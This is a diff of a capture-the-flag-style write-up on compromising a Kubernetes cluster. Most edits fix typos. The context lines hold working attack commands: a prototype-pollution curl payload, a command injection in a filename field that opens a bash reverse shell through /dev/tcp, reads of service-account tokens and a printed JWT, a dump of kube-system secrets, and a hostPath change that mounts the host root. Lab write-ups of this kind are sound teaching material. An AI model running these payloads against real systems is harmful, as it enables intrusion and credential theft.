@@ -313,8 +313,8 @@ Usually in the directory `/run/secrets/kubernetes.io/serviceaccount` or `/var/ru
 
 Found blog for [create kubeconfig](http://docs.shippable.com/deploy/tutorial/create-kubeconfig-for-self-hosted-kubernetes-cluster/)
 
-* `token` come from `/run/secrets/kubernetes.io/serviceaccount/token`
-* `certificate-authority-data` come form `/run/secrets/kubernetes.io/serviceaccount/ca.crt` in base64 encoded format
+* `token` came from `/run/secrets/kubernetes.io/serviceaccount/token`
+* `certificate-authority-data` came form `/run/secrets/kubernetes.io/serviceaccount/ca.crt` in base64 encoded format
 
 ```yaml
 apiVersion: v1
@@ -373,7 +373,7 @@ kubectl get pods -n dev
 
 ![](screenshots/kube-dev-pods.png)
 
-If we check one of the pod information, we can see that they all pods are running a node application on port 3000. These are the replicas of the application that is running on public port 31337, Where we found the prototype pollution and command injection.
+If we check one of the pod information, we can see that all pods are running a node application on port 3000. These are the replicas of the application that is running on public port 31337, Where we found the prototype pollution and command injection.
 ```bash
 kubectl describe pod <pod_name> -n dev
 ```
@@ -399,7 +399,7 @@ Exploit Prototype Pollution to enable upload funcnality
 curl -s -X PUT 'http://172.17.0.10:3000' --data '{"auth": {"name": "felamos", "password": "Winter2021"},"message": {"text": "Prototype_Pollution", "__proto__": {"canUpload": true}}}' -H 'Content-type: application/json'
 ```
 
-Exloit Command injection to get reverse shell
+Exploit Command injection to get reverse shell
 ```bash
 curl -s -X POST 'http://172.17.0.10:3000/upload' --data '{"auth": {"name": "felamos", "password": "Winter2021"}, "filename": "& /bin/bash -c \"bash -i >& /dev/tcp/172.17.0.5/8080 0>&1\""}' -H 'Content-type: application/json'
 ```
@@ -411,7 +411,7 @@ curl -s -X POST 'http://172.17.0.10:3000/upload' --data '{"auth": {"name": "fela
 eyJhbGciOiJSUzI1NiIsImtpZCI6IkpOdm9iX1ZETEJ2QlZFaVpCeHB6TjBvaWNEalltaE1ULXdCNWYtb2JWUzgifQ.eyJpc3MiOiJrdWJlcm5ldGVzL3NlcnZpY2VhY2NvdW50Iiwia3ViZXJuZXRlcy5pby9zZXJ2aWNlYWNjb3VudC9uYW1lc3BhY2UiOiJkZXYiLCJrdWJlcm5ldGVzLmlvL3NlcnZpY2VhY2NvdW50L3NlY3JldC5uYW1lIjoiZGVmYXVsdC10b2tlbi1ybWNkNiIsImt1YmVybmV0ZXMuaW8vc2VydmljZWFjY291bnQvc2VydmljZS1hY2NvdW50Lm5hbWUiOiJkZWZhdWx0Iiwia3ViZXJuZXRlcy5pby9zZXJ2aWNlYWNjb3VudC9zZXJ2aWNlLWFjY291bnQudWlkIjoiMzQxZTdlNjYtNGIwZC00YTZlLWIzODgtOWE2ODQwNTVmOWRmIiwic3ViIjoic3lzdGVtOnNlcnZpY2VhY2NvdW50OmRldjpkZWZhdWx0In0.NdoMnigZmgPQR98lNmLdrF8iG_4yJMEVnyM0UHoZ4B2lh_Dve524sohFRhoBM3hxN2He7l0P3U2lSZXZO272tlmj48lly-_fGRfQ4xcXIbH7lvmiq2qHKcP4MJGql5X4NH4ereZvwkTvSyduRmEcw31qmn1Gres2eQxf4_2WBsC_4CAyMQPMktS1O6p54c_0BaX76ZGJjXKHsOXhrBZ1jzTcX8OGdlfss2eaMv1DtYkzqoK7Ug5Ru7LpUNsqfooWNdekYFCBj6OZxIwIgPbz0pgIPgByJAm6gUBnpaya4vnUzkIPBsek7rr5fz6OKxeggOo5ZjbLOyQSuVFpn43TIw
 -->
 
-Trying to get secret from this pod, This time we get secrets and found admin token
+and From this pod's Current Privileges `kubectl auth can-i --list`, We can read kubernetes secrets and found admin token
 ```bash
 kubectl get secrets -o yaml -n kube-system
 ```
@@ -438,14 +438,14 @@ in `webapp-deployment` there is already a host volume `/opt/user/` is mounted in
 
 ![](screenshots/edit-deployment.png)
 
-here we can simply edit host path to root `/` and get host root filesystem in the container's `/root`
+here we can simply edit hostpath and replace with `/` and get host root filesystem in the container's `/root`
 
 after edited check if deployment get restarted and new pods generated.
 ```bash
 kubectl get pods --all-namespaces
 ```
 
-Here one problem i notice that after adding host root filesystem in `webapp-deployment`, this cluster died in every minute and regenerate again
+Here new problem comes, After adding host root filesystem in `webapp-deployment`, this cluster died in every minute and regenerate new pods again
 
 ![](screenshots/deployment-in-loop.png)
 
